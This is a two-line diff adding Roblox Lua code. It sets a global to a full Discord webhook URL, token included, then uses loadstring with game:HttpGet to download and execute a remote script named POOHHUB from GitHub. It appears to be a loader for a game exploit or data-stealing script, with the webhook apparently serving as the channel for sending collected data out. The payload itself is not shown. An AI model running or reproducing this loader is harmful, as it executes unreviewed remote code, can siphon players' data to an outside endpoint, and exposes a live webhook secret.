@@ -1,0 +1,2 @@
+_G.webhooksdiscord = "https://discord.com/api/webhooks/980440727802749029/zmOzb3zL7P7HGgCOybtS2moF7UQIbsiEvv1fmYR2vWojU4hr9ckjSQous82gyFP4356i"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TEWIOCK/POOHHUB/main/POOHHUB"))()
